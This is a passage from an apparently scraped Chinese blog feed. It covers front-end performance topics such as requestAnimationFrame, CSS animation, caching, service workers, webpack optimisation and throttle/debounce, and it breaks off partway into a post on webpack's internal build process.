title="动画"></a>动画</h2><p>动画的实现方式</p><ul><li>可以通过setTimeout和setInterval方法来在脚本中实现动画，但是这样效果可能不够流畅，且会占用额外的资源</li><li>使用requestAnimationFrame</li></ul><ul><li>这个方法原理其实也就跟setTimeout/setInterval差不多，通过递归调用同一方法来不断更新画面以达到动起来的效果，</li><li>requestAnimationFrame不需要使用者指定循环间隔时间，浏览器会基于当前页面是否可见、CPU的负荷情况等来自行决定最佳的帧速率，从而更合理地使用CPU。</li><li>但它优于setTimeout/setInterval的地方在于它是由浏览器专门为动画提供的API，在运行时浏览器会自动优化方法的调用，并且如果页面不是激活状态下的话，动画会自动暂停，有效节省了CPU开销。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//用来兼容不同浏览器</span><br><span class="line">window.requestAnimat = (function()&#123;</span><br><span class="line">    return window.requestAnimationFrame ||</span><br><span class="line">    window.webkitRequestAnimationFrame  ||</span><br><span class="line">    window.mozRequestAnimationFrame || function(callback)&#123;</span><br><span class="line">        setTimeout(callback, 1000/60);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>为什么settimeout不够流畅</p><ul><li>1、即使向其传递毫秒为单位的参数，它们也不能达到ms的准确性。这是因为javascript是单线程的，可能会发生阻塞。</li><li>2、没有对调用动画的循环机制进行优化。</li><li>3、没有考虑到绘制动画的最佳时机，只是一味地以某个大致的事件间隔来调用循环。</li></ul><p><strong><em> 其实，使用setInterval或setTimeout来实现主循环，根本错误就在于它们抽象等级不符合要求。我们想让浏览器执行的是一套可以控制各种细节的api，实现如“最优帧速率”、“选择绘制下一帧的最佳时机”等功能。但是如果使用它们的话，这些具体的细节就必须由开发者自己来完成。 </em></strong></p><p>requestIdleCallback<br>当关注用户体验，不希望因为一些不重要的任务（如统计上报）导致用户感觉到卡顿的话，就应该考虑使用requestIdleCallback。因为requestIdleCallback回调的执行的前提条件是当前浏览器处于空闲状态。</p><p>requestIdleCallback和requestAnimationFrame有什么区别？<br>requestAnimationFrame的回调会在每一帧确定执行，属于高优先级任务，而requestIdleCallback的回调则不一定，属于低优先级任务。<br>我们所看到的网页，都是浏览器一帧一帧绘制出来的，通常认为FPS为60的时候是比较流畅的，而FPS为个位数的时候就属于用户可以感知到的卡顿了</p><p>CSS动画：<br>animation与transition</p><p>区别：<br>1.动画状态的区别：<br>animation动画可以通过@keyframes属性对动画进行更为精细的控制，设置多个状态。<br>但是transition属性则只有两个状态，起始状态与结束状态。<br>2.子属性的数量不同：<br>两个属性都是复合属性，包含有若干个子属性，但是数目不相同。<br>当然子属性数量不同会对效果有影响，很容易区分<br>3.触发时机不同：<br>两个属性的触发时机有很大的不同，animation好比是一个自执行函数，只要定义好，立马生效触发动画。<br>transition则像是一个事件处理函数（事件监听器），只有它监听的属性值发生改变，动画效果才会生效。</p><p><strong><em> 我们知道CSS是比js动画要流畅的 </em></strong> </p><p>CSS动画流畅的原因:<br>渲染线程分为main thread(主线程)和compositor thread(合成器线程)。<br>如果CSS动画只是改变transform和opacity，这时整个CSS动画得以在compositor thread完成（而JS动画则会在main thread执行，然后触发compositor进行下一步操作）<br>在JS执行一些昂贵的任务时，main thread繁忙，CSS动画由于使用了compositor thread可以保持流畅，</p><p>当然，这并非不需要前提（CSS动画比JS流畅的前提）</p><ul><li>JS在执行一些昂贵的任务 同时CSS动画不触发layout或paint</li><li>在CSS动画或JS动画触发了paint或layout时，需要main thread进行Layer树的重计算，这时CSS动画或JS动画都会阻塞后续操作。</li><li>只有如下属性的修改才符合“仅触发Composite，不触发layout或paint”：</li><li>backface-visibility、opacity、perspective、perspective-origin、transfrom</li></ul><p>所以只有用上了3D加速或修改opacity时，css3动画的优势才会体现出来。（代码相对简单,性能调优方向固定，对于帧速表现不好的低版本浏览器，CSS3可以做到自然降级，而JS则需要撰写额外代码）</p><h2 id="will-change"><a href="#will-change" class="headerlink" title="will change"></a>will change</h2><p>这是一个实验中的功能</p><p>CSS 属性 will-change 为web开发者提供了一种告知浏览器该元素会有哪些变化的方法，这样浏览器可以在元素属性真正发生变化之前提前做好对应的优化准备工作。 这种优化可以将一部分复杂的计算工作提前准备好，使页面的反应更为快速灵敏。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.sidebar &#123;</span><br><span class="line">  will-change: transform;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>不要将 will-change 应用到太多元素上</li><li>有节制地使用</li><li>不要过早应用 will-change 优化</li><li>给它足够的工作时间</li></ul><h2 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h2><p>CDN其功能是将内容“发布”到离用户最近的服务器上，有效的避免网络拥塞（越远的距离越容易遇到拥塞）。CDN提供就近访问的能力，消除了由于用户离机房的距离不一样带来的体验差异。</p><p>我们都知道静态资源要放在CDN上。不仅是加速访问还可以有效的环节业务服务器的压力。并且如上文所说的，如果有很多静态资源的话，每一个请求都要携带cookie，是有很大程度的浪费的。</p><p>当然，CDN的使用上也会有一些问题，关于命中率的问题。CDN也有一些常用的优化策略。：静态化缓存优化、动态内容静态边缘化、动态加速优化</p><h2 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h2><p>服务端缓存：<br>memcache、redis、数据库缓存<br>http缓存，如上<br>客户端缓存：<br>MemoryCache、localstorage、sessionstorage、cookie、indexdb、websql、service worker</p><p>MemoryCache，是指存在内存中的缓存。从优先级上来说，它是浏览器最先尝试去命中的一种缓存。从效率上来说，它是响应速度最快的一种缓存。</p><p>localStorage只要在相同的协议、相同的主机名、相同的端口下，就能读取/修改到同一份localStorage数据。<br>sessionStorage比localStorage更严苛一点，除了协议、主机名、端口外，还要求在同一窗口（也就是浏览器的标签页）下。<br>sessionStorage当会话结束（当前页面关闭的时候，自动销毁）</p><p>cookie 只是我们认为可以作为存储的一种。Cookie 的本职工作并非本地存储，而是“维持状态”。<br>Cookie 是有体积上限的，它最大只能有 4KB。当 Cookie 超过 4KB 时，它将面临被裁切的命运。这样看来，Cookie 只能用来存取少量的信息。<br>而且cookie与会自动发送到相同域名下的浏览器，如果cookie 过大，会很大程度上影响性能。所以才有了。我们常说的，静态资源放在CDN上，而且CDN的域名也会有多个。（域名合并是常见的CDN优化手段之一，对于web网页来说，为了提高浏览器的并行下载能力，往往会使用多个域名。）</p><p>还有些数据的请求的结果，会放在本地的数据库中。websql、indexdb</p><h2 id="service-worker"><a href="#service-worker" class="headerlink" title="service worker"></a>service worker</h2><p>我们知道service worker 有一个作用是用于离线存储</p><p>可以让 Service Worker 成为监听 fetch 事件的中间人,也可以让 Service Worker 保存某些资源在缓存里。当缓存项被请求，Service Worker 无需发出额外的请求就可以返回缓存数据。只要资源被缓存，浏览器无需网络连接就可以展示内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// 简单实例</span><br><span class="line">// Service Worker监听所有的网络请求，网络请求的产生触发的是fetch事件，</span><br><span class="line">// 可以在其对应的监听函数中实现对请求的拦截，进而判断是否有对应到该请求的缓存，</span><br><span class="line">// 实现从Service Worker中取到缓存的目的</span><br><span class="line">self.addEventListener(&apos;fetch&apos;, event =&gt; &#123;</span><br><span class="line">  event.respondWith(</span><br><span class="line">    // 尝试匹配该请求对应的缓存值</span><br><span class="line">    caches.match(event.request).then(res =&gt; &#123;</span><br><span class="line">      // 如果匹配到了，调用Server Worker缓存</span><br><span class="line">      if (res) &#123;</span><br><span class="line">        return res;</span><br><span class="line">      &#125;</span><br><span class="line">      // 如果没匹配到，向服务端发起这个资源请求</span><br><span class="line">      return fetch(event.request).then(response =&gt; &#123;</span><br><span class="line">        if (!response || response.status !== 200) &#123;</span><br><span class="line">          return response;</span><br><span class="line">        &#125;</span><br><span class="line">        // 请求成功的话，将请求缓存起来。</span><br><span class="line">        caches.open(cacheName).then(function(cache) &#123;</span><br><span class="line">          console.log(&apos;event.request&apos;, event.request)</span><br><span class="line">          if (event.request.method !== &apos;POST&apos; &amp;&amp; event.request.url.indexOf(&apos;sockjs-node&apos;) &lt; 0)  &#123;</span><br><span class="line">            cache.put(event.request, response);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        return response.clone();</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">  );</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>Service Worker 特点: </p><ul><li>网站必须使用 HTTPS。除了使用本地开发环境调试时(如域名使用 localhost)</li><li>运行于浏览器后台，可以控制打开的作用域范围下所有的页面请求</li><li>单独的作用域范围，单独的运行环境和执行线程</li><li>不能操作页面 DOM。但可以通过事件机制来处理</li></ul><h2 id="Push-Cache"><a href="#Push-Cache" class="headerlink" title="Push Cache"></a>Push Cache</h2><ul><li>1.Service Worker </li><li>2.Memory Cache</li><li>3.Disk Cache</li></ul><p>Push Cache（推送缓存）是 HTTP/2 中的内容，当以上三种缓存都没有命中时，它才会被使用。它只在会话（Session）中存在，一旦会话结束就被释放，并且缓存时间也很短暂，在Chrome浏览器中只有5分钟左右，同时它也并非严格执行HTTP头中的缓存指令。</p><h2 id="工程构建部分"><a href="#工程构建部分" class="headerlink" title="工程构建部分"></a>工程构建部分</h2><p>有构建速度、减少包大小、抽离公用模块、上传CDN、开启Gzip等等</p><p>一般webpack 优化策略</p><p>1、优化Loader，配置include和exclude。同时把Babel编译过的文件缓存起来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">loader: &apos;babel-loader?cacheDirectory=ture&apos;</span><br></pre></td></tr></table></figure><p>2、Happy启用多线程(webpack4 生产模式，默认开启多个子进程（线程）由之前的一个一个压缩，变为并行压缩)<br>3、DllPlugin将特定的类库提前打包然后引入，极大减少打包类库的构建次数<br>4、css 抽离mini-css-extract-plugin<br>5、html-webpack-plugin压缩html，当然html-webpack-plugin不止与于html的压缩<br>6、合并压缩图片，转换url-loader转换图片<br>7、Scope Hoisting（尽可能的合并打包出来的模块打一个函数中去）<br>8、依赖库分离（optimization.splitChunks）<br>9、按需加载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@babel/plugin-syntax-dynamic-import</span><br><span class="line">import (/* webpackChunkName: &quot;authModal&quot; */ &apos;common/sth/index&apos;).then(chunk =&gt; &#123;</span><br><span class="line">  let sthModal = chunk.default,</span><br><span class="line">  sthModal();</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>10、Tree Shaking（webpack 4 生产环境 默认开启）<br>11、alias别名的方式来映射一个路径，能让 Webpack 更快找到路径<br>12、noParse 当确定一个文件下没有其他依赖，就可以使用该属性让 Webpack 不扫描该文件<br>13、优化模块查找路径<br>14、preload-webpack-plugin 获取代码拆分的路径<br>15、webpack.IgnorePlugin(/^.\/locale$/, /moment$/) 忽略部分内容</p><ul><li>moment这个库中，如果引用了./locale/目录的内容，就忽略掉，不会打包进去<br>16、ModuleConcatenationPlugin进行scope hoisting（文件体积比之前更小，运行代码时创建的函数作用域也比之前少了，开销也随之变小。）</li></ul><p>preload与prefetch 区别： </p><ul><li>preload 是声明式的 fetch，可以强制浏览器请求资源，同时不阻塞文档 onload 事件。</li><li><p>Prefetch 提示浏览器这个资源将来可能需要，但是把决定是否和什么时间加载这个资源的决定权交给浏览器。</p></li><li><p>preload 提前加载</p></li><li><p>preload 顾名思义就是一种预加载的方式，它通过声明向浏览器声明一个需要提交加载的资源，当资源真正被使用的时候立即执行，就无需等待网络的消耗。</p></li><li><p>prefetch 预判加载</p></li><li>prefetch 跟 preload 不同，它的作用是告诉浏览器未来可能会使用到的某个资源，浏览器就会在闲时去加载对应的资源，若能预测到用户的行为，比如懒加载，点击到其它页面等则相当于提前预加载了需要的资源。它的用法跟 preload 是一样的：</li></ul><p><strong><em> 什么时候该用 &lt;link rel=”preload”&gt; ？ 什么时候又该用 &lt;link rel=”prefetch”&gt; ? </em></strong></p><ul><li>对于当前页面很有必要的资源使用 preload，对于可能在将来的页面中使用的资源使用 prefetch。</li><li>preload 是对浏览器指示预先请求当前页需要的资源（关键的脚本，字体，主要图片）。</li><li>prefetch 应用场景稍微又些不同 —— 用户将来可能在其他部分（比如视图或页面）使用到的资源。如果 A 页面发起一个 B 页面的 prefetch 请求，这个资源获取过程和导- 航请求可能是同步进行的，而如果我们用 preload 的话，页面 A 离开时它会立即停止。</li></ul><h2 id="节流、防抖"><a href="#节流、防抖" class="headerlink" title="节流、防抖"></a>节流、防抖</h2><ul><li>连续操作：两个操作之间的时间间隔小于设定的阀值，这样子的一连串操作视为连续操作。</li></ul><p>throttle函数与debounce函数区别:<br>防抖 (debounce): 将多次高频操作优化为只在最后一次执行，通常使用的场景是：用户输入，只需再输入完成后做一次输入校验即可。<br>节流(throttle): 每隔一段时间后执行一次，也就是降低频率，将高频操作优化成低频操作，通常使用场景: 滚动条事件 或者 resize 事件，通常每隔 100~500 ms执行一次即可。</p><p>debounce（防抖）：一个连续操作中的处理，只触发一次，从而实现防抖动。<br>throttle：一个连续操作中的处理，按照阀值时间间隔进行触发，从而实现节流。（throttle 可以限制函数调⽤用的频率,常⽤用来防⽌止按钮被重复点击。）</p><ul><li>“节流”与“防抖”的本质:这两个东西都以闭包的形式存在。它们通过对事件对应的回调函数进行包裹、以自由变量的形式缓存时间信息，最后用 setTimeout 来控制事件的触发频率。</li><li>throttle 的中心思想在于：在某段时间内，不管你触发了多少次回调，我都只认第一次，并在计时结束时给予响应。</li><li>防抖(debounce)的中心思想在于：我会等你到底。在某段时间内，不管你触发了多少次回调，我都只认最后一次。</li></ul><p>throttle函数与debounce函数的区别就是：throttle函数在触发后会马上执行，而debounce函数会在一定延迟后才执行。从触发开始到延迟结束，只执行函数一次</p><h3 id="debounce-的问题"><a href="#debounce-的问题" class="headerlink" title="debounce 的问题"></a>debounce 的问题</h3><p>debounce 的问题在于它“太有耐心了”。如果用户的操作十分频繁——他每次都不等 debounce 设置的 delay 时间结束就进行下一次操作，于是每次 debounce 都为该用户重新生成定时器，回调函数被延迟了不计其数次。频繁的延迟会导致用户迟迟得不到响应，用户同样会产生“这个页面卡死了”的观感。</p><ul><li>用 Throttle 来优化 Debounce</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">// fn是我们需要包装的事件回调, delay是时间间隔的阈值</span><br><span class="line">function throttle(fn, delay) &#123;</span><br><span class="line">  // last为上一次触发回调的时间, timer是定时器</span><br><span class="line">  let last = 0, timer = null</span><br><span class="line">  // 将throttle处理结果当作函数返回</span><br><span class="line">  </span><br><span class="line">  return function () &#123; </span><br><span class="line">    // 保留调用时的this上下文</span><br><span class="line">    let context = this</span><br><span class="line">    // 保留调用时传入的参数</span><br><span class="line">    let args = arguments</span><br><span class="line">    // 记录本次触发回调的时间</span><br><span class="line">    let now = +new Date()</span><br><span class="line">    </span><br><span class="line">    // 判断上次触发的时间和本次触发的时间差是否小于时间间隔的阈值</span><br><span class="line">    if (now - last &lt; delay) &#123;</span><br><span class="line">    // 如果时间间隔小于我们设定的时间间隔阈值，则为本次触发操作设立一个新的定时器</span><br><span class="line">       clearTimeout(timer)</span><br><span class="line">       timer = setTimeout(function () &#123;</span><br><span class="line">          last = now</span><br><span class="line">          fn.apply(context, args)</span><br><span class="line">        &#125;, delay)</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // 如果时间间隔超出了我们设定的时间间隔阈值，那就不等了，无论如何要反馈给用户一次响应</span><br><span class="line">        last = now</span><br><span class="line">        fn.apply(context, args)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 用新的throttle包装scroll的回调</span><br><span class="line">const better_scroll = throttle(() =&gt; console.log(&apos;触发了滚动事件&apos;), 1000)</span><br><span class="line"></span><br><span class="line">document.addEventListener(&apos;scroll&apos;, better_scroll)</span><br></pre></td></tr></table></figure><h2 id="性能检测与分析"><a href="#性能检测与分析" class="headerlink" title="性能检测与分析"></a>性能检测与分析</h2><p>YSlow、PageSpeed、lightHouse（可以通过npm安装、安装chrome插件，chrome的Audits）、performance</p><p>性能监控体系搭建</p><p><strong><em>运行时性能瓶颈分析</em></strong></p><h2 id="雅虎军规35条"><a href="#雅虎军规35条" class="headerlink" title="雅虎军规35条"></a>雅虎军规35条</h2><h3 id="内容部分"><a href="#内容部分" class="headerlink" title="内容部分"></a>内容部分</h3><p>1.尽量减少HTTP请求数<br>2.减少DNS查找<br>3.避免重定向<br>4.让Ajax可缓存<br>5.延迟加载组件<br>6.预加载组件<br>7.减少DOM元素的数量<br>8.跨域分离组件<br>9.尽量少用iframe<br>10.杜绝404</p><h3 id="css部分"><a href="#css部分" class="headerlink" title="css部分"></a>css部分</h3><p>11.避免使用CSS表达式<br>12.选择舍弃@import<br>13.避免使用滤镜<br>14.把样式表放在顶部 </p><h3 id="js部分"><a href="#js部分" class="headerlink" title="js部分"></a>js部分</h3><p>15.去除重复脚本<br>16.尽量减少DOM访问<br>17.用智能的事件处理器<br>18.把脚本放在底部 </p><p>javascript, css<br>19.把JavaScript和CSS放到外面<br>20.压缩JavaScript和CSS </p><h3 id="图片-1"><a href="#图片-1" class="headerlink" title="图片"></a>图片</h3><p>21.优化图片<br>22.优化CSS Sprite<br>23.不要用HTML缩放图片<br>24.用小的可缓存的favicon.ico（P.S. 收藏夹图标） </p><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>25.给Cookie减肥 </p><h3 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h3><p>34.使用CDN（内容分发网络）<br>35.添上Expires或者Cache-Control HTTP头 </p><h2 id="高性能网站建设指南"><a href="#高性能网站建设指南" class="headerlink" title="高性能网站建设指南"></a>高性能网站建设指南</h2><p>《高性能网站建设指南》 总结了12条基本规则</p><ul><li>尽量减少http请求</li><li>使用CDN</li><li>静态资源使用cahce</li><li>启用Gzip压缩</li><li>JavaScript脚本尽量放在页面底部</li><li>CSS 表达式放在顶部</li><li>避免CSS表达式</li><li>减少内联Javascript和css 的使用，尽可能使用外部的js和css文件</li><li>减少DNS查询</li><li>精简js</li><li>避免重定向</li><li>删除重复的脚本</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前端性能优化零碎知识点的一些东西，可能相对比较不太成”体统“简单理下，零碎的但必要的知识点。从“输入 URL 到页面加载完成，发生了什么”的角度简单梳理一遍&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DNS 解析&lt;/li&gt;
&lt;li&gt;TCP 连接&lt;/li&gt;
&lt;li&gt;HTTP 请求发送&lt;/li
      
    
    </summary>
    
    
      <category term="技术" scheme="http://swingboy.github.io/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>webpack原理</title>
    <link href="http://swingboy.github.io/2019/03/29/webpack%E5%8E%9F%E7%90%86/"/>
    <id>http://swingboy.github.io/2019/03/29/webpack原理/</id>
    <published>2019-03-29T12:49:07.000Z</published>
    <updated>2020-04-24T03:22:52.783Z</updated>
    
    <content type="html"><![CDATA[<h1 id="webpack-原理"><a href="#webpack-原理" class="headerlink" title="webpack 原理"></a>webpack 原理</h1><h2 id="webpack核心概念"><a href="#webpack核心概念" class="headerlink" title="webpack核心概念"></a>webpack核心概念</h2><p>entry 一个可执行模块或库的入口文件。</p><p>chunk 多个文件组成的一个代码块，例如把一个可执行模块和它所有依赖的模块组合和一个 chunk. </p><p>loader 文件转换器，例如把es6转换为es5，scss转换为css。</p><p>plugin 插件，用于扩展webpack的功能，在webpack构建生命周期的节点上加入扩展hook为webpack添加功能。  </p><h3 id="webpack-模块？"><a href="#webpack-模块？" class="headerlink" title="webpack 模块？"></a>webpack 模块？</h3><p>对比 Node.js 模块，webpack 模块能够以各种方式表达它们的依赖关系，几个例子如下：</p><p>ES2015 import 语句<br>CommonJS require() 语句<br>AMD define 和 require 语句<br>css/sass/less 文件中的 @import 语句<br>样式(url(…))或 HTML 文件(&lt;img src=…\&gt;)中的图片链接(image url) </p><h3 id="支持的模块类型"><a href="#支持的模块类型" class="headerlink" title="支持的模块类型"></a>支持的模块类型</h3><p>webpack 通过 loader 可以支持各种语言和预处理器编写模块。loader 描述了 webpack 如何处理 非 JavaScript(non-JavaScript) 模块，并且在bundle中引入这些依赖。 webpack 社区已经为各种流行语言和语言处理器构建了 loader，包括：</p><ul><li>CoffeeScript</li><li>TypeScript</li><li>ESNext (Babel)</li><li>Sass</li><li>Less</li><li>Stylus</li></ul><h3 id="事件系统"><a href="#事件系统" class="headerlink" title="事件系统"></a>事件系统</h3><p>Webpack的基础组件之一Tapable是为其量身定做的“EventEmitter”，但它不只是单纯的事件中枢，还相应补充了对事件流程的控制能力，增加了如waterfall/series/parallel系列方法，实现了同步/异步、顺序/并行等事件流的控制能力。</p><ul><li>发布/订阅模式</li></ul><h2 id="webpack构建流程-总括"><a href="#webpack构建流程-总括" class="headerlink" title="webpack构建流程 总括"></a>webpack构建流程 总括</h2><p>解析webpack配置参数，合并从shell传入和webpack.config.js文件里配置的参数，生产最后的配置结果。</p><p>注册所有配置的插件，好让插件监听webpack构建生命周期的事件节点，以做出对应的反应。 </p><p>从配置的entry入口文件开始解析文件构建AST语法树，找出每个文件所依赖的文件，递归下去。 </p><p>在解析文件递归的过程中根据文件类型和loader配置找出合适的loader用来对文件进行转换。  </p><p>递归完后得到每个文件的最终结果，根据entry配置生成代码块chunk。  </p><p>输出所有chunk到文件系统。  </p><ul><li>在构建生命周期中有一系列插件在合适的时机做了合适的事情，比如一些插件的操作。</li><li>Webpack 会在特定的时间点广播出特定的事件</li></ul><h3 id="1-webpack入口（webpack-config-js和shell-options）"><a href="#1-webpack入口（webpack-config-js和shell-options）" class="headerlink" title="1. webpack入口（webpack.config.js和shell options）"></a>1. webpack入口（webpack.config.js和shell options）</h3><p>从配置文件package.json 和 Shell 语句中读取与合并参数，得出最终的参数；</p><p>每次在命令行输入 webpack 后，操作系统都会去调用 ./node_modules/.bin/webpack 这个 shell 脚本。这个脚本会去调用 ./node_modules/webpack/bin/webpack.js </p><ul><li>开一个子进程处理 cli</li></ul><h3 id="2-用yargs参数解析"><a href="#2-用yargs参数解析" class="headerlink" title="2. 用yargs参数解析"></a>2. 用yargs参数解析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// webpack/bin/webpack.js =&gt; webpack-cli/bin/cli.js</span><br><span class="line">yargs.parse(process.argv.slice(2), (err, argv, output) =&gt; &#123;</span><br></pre></td></tr></table></figure><h3 id="3-webpack初始化"><a href="#3-webpack初始化" class="headerlink" title="3.webpack初始化"></a>3.webpack初始化</h3><p>（1）构建compiler对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// webpack-cli/bin/cli.js</span><br><span class="line">let lastHash = null;</span><br><span class="line">let compiler;</span><br><span class="line">try &#123;</span><br><span class="line">    compiler = webpack(options);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">compiler = new Compiler(options.context);</span><br></pre></td></tr></table></figure><ul><li>还会某些阶段注册一些钩子，compiler.hooks.watchRun、beforeRun、done</li></ul><p>（2）注册NodeEnvironmentPlugin插件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 在webpack/lib/webpack.js </span><br><span class="line">new NodeEnvironmentPlugin().apply(compiler);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">//NodeEnvironmentPlugin.js</span><br><span class="line">apply(compiler) &#123;</span><br><span class="line">    compiler.inputFileSystem = new CachedInputFileSystem(</span><br><span class="line">        new NodeJsInputFileSystem(),</span><br><span class="line">        60000</span><br><span class="line">    );</span><br><span class="line">    const inputFileSystem = compiler.inputFileSystem;</span><br><span class="line">    compiler.outputFileSystem = new NodeOutputFileSystem();</span><br><span class="line">    compiler.watchFileSystem = new NodeWatchFileSystem(</span><br><span class="line">        compiler.inputFileSystem</span><br><span class="line">    );</span><br><span class="line">    // 注册beforeRun</span><br><span class="line">    compiler.hooks.beforeRun.tap(&quot;NodeEnvironmentPlugin&quot;, compiler =&gt; &#123;</span><br><span class="line">        if (compiler.inputFileSystem === inputFileSystem) inputFileSystem.purge();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（3）挂载options中的基础插件，调用WebpackOptionsApply库初始化基础插件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">//webpack/lib/webpack.js</span><br><span class="line">compiler.options = options;</span><br><span class="line">new NodeEnvironmentPlugin().apply(compiler);</span><br><span class="line">if (options.plugins &amp;&amp; Array.isArray(options.plugins)) &#123;</span><br><span class="line">    for (const plugin of options.plugins) &#123;</span><br><span class="line">        if (typeof plugin === &quot;function&quot;) &#123;</span><br><span class="line">            plugin.apply(compiler);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            plugin.apply(compiler);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">compiler.hooks.environment.call();</span><br><span class="line">compiler.hooks.afterEnvironment.call();</span><br><span class="line">//调用WebpackOptionsApply库初始化基础插件。</span><br><span class="line">compiler.options = new WebpackOptionsApply().process(options, compiler);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//  WebpackOptionsApply</span><br><span class="line">class WebpackOptionsApply extends OptionsApply &#123;</span><br><span class="line">constructor() &#123;</span><br><span class="line">super();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @param &#123;WebpackOptions&#125; options options object</span><br><span class="line"> * @param &#123;Compiler&#125; compiler compiler object</span><br><span class="line"> * @returns &#123;WebpackOptions&#125; options object</span><br><span class="line"> */</span><br><span class="line">process(options, compiler) &#123;</span><br><span class="line">        // 一堆基础插件</span><br><span class="line">        ...</span><br><span class="line">let ExternalsPlugin;</span><br><span class="line">        new JsonpTemplatePlugin().apply(compiler);</span><br><span class="line">        new FetchCompileWasmTemplatePlugin(&#123;</span><br><span class="line">            mangleImports: options.optimization.mangleWasmImports</span><br><span class="line">        &#125;).apply(compiler);</span><br><span class="line">        new 